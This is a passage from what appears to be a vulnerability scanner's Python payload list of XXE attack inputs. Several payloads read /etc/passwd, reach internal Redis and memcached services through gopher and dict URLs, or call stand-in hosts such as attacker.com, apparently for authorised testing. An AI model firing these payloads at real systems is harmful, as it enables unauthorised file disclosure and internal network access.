        severity="High",
        safe=True,
        confirmation=xxe_error_confirm
    ),
    Payload(
        vuln_type="XXE",
        name="External DTD probe",
        payload='<?xml version="1.0"?><!DOCTYPE foo SYSTEM "http://xxe-canary.attacker.com/probe.dtd"><foo>test</foo>',
        contexts=["xml"],
        severity="High",
        safe=True,
        confirmation=xxe_error_confirm
    ),

    # ============================================
    # 12. PROTOCOL VARIATIONS
    # ============================================
    Payload(
        vuln_type="XXE",
        name="Gopher protocol",
        payload='<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "gopher://127.0.0.1:6379/_INFO">]><foo>&xxe;</foo>',
        contexts=["xml"],
        severity="Critical",
        safe=True,
        confirmation=xxe_ssrf_confirm
    ),
    Payload(
        vuln_type="XXE",
        name="NetDoc protocol (Java)",
        payload='<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "netdoc:///etc/passwd">]><foo>&xxe;</foo>',
        contexts=["xml"],
        severity="Critical",
        safe=True,
        confirmation=xxe_file_confirm
    ),
    Payload(
        vuln_type="XXE",
        name="Jar protocol (Java)",
        payload='<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "jar:http://attacker.com/evil.jar!/evil.txt">]><foo>&xxe;</foo>',
        contexts=["xml"],
        severity="Critical",
        safe=True,
        confirmation=xxe_error_confirm
    ),
    Payload(
        vuln_type="XXE",
        name="Dict protocol",
        payload='<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "dict://127.0.0.1:11211/stat">]><foo>&xxe;</foo>',
        contexts=["xml"],
        severity="High",
        safe=True,
        confirmation=xxe_ssrf_confirm
    ),
    Payload(
        vuln_type="XXE",
        name="LDAP protocol",
        payload='<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "ldap://attacker.com/cn=test">]><foo>&xxe;</foo>',
        contexts=["xml"],
        severity="Critical",
        safe=True,
        confirmation=xxe_error_confirm
    ),
]
